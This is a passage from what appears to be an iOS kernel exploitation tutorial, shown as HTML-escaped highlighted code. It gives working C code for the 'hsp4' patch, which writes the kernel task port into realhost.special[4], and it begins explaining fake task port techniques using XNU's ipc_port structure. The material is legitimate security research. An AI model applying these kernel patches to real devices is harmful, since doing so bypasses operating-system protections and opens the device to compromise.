        &lt;span class=&quot;n&quot;&gt;vm_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Get address of kernel task&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_read_overwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;slid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;THROW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to get kernel task address: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Kernel task address: &quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Get address of kernel task/self port&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_read_overwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unslid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;off_task_itk_self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;THROW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to get kernel task port address: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Kernel task port address: &quot;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ADDR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Check if realhost.special[4] is set already&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_read_overwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;THROW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to read realhost.special[4]: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Patch already in place, nothing to do&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;THROW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;realhost.special[4] has a valid port already&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Write to realhost.special[4]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;special&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_self_port_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;THROW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to patch realhost.special[4]: %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_error_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;DEBUG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Successfully installed patch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This technique is also known as the &lt;strong&gt;hsp4&lt;/strong&gt; patch and widely used in some of the recent jailbreaks.&lt;/p&gt;

&lt;h2 id=&quot;faking-task-ports&quot;&gt;Faking Task Ports&lt;/h2&gt;

&lt;p&gt;One of the most common techniques used in some of the recent jailbreaks is that of using Fake ports. The idea is to make the kernel look up a user controlled memory space thinking that it is a port. Using certain APIs, we can then extract data out of the kernel.&lt;/p&gt;

&lt;p&gt;Let’s have a look at the stripped port structure which can be found in &lt;strong&gt;osfmk/ipc/ipc_port.h&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    116: 	 * Initial sub-structure in common with ipc_pset
    117: 	 * First element is an ipc_object second is a
    118: 	 * message queue
    119: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_mqueue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_messages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_timestamp_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;130&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_kobject_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;131&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_importance_task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imp_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ipc_port_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sync_inheritor_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;knote&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync_inheritor_knote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;134&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turnstile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sync_inheritor_ts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_nsrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;138&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_pdrequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_port_request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;premsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turnstile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_turnstile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;SLIST_ENTRY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dealloc_elm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kdata2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first attribute is an &lt;strong&gt;ipc_object&lt;/strong&gt; struct that can be found in &lt;strong&gt;osfmk/ipc/ipc_object.h&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
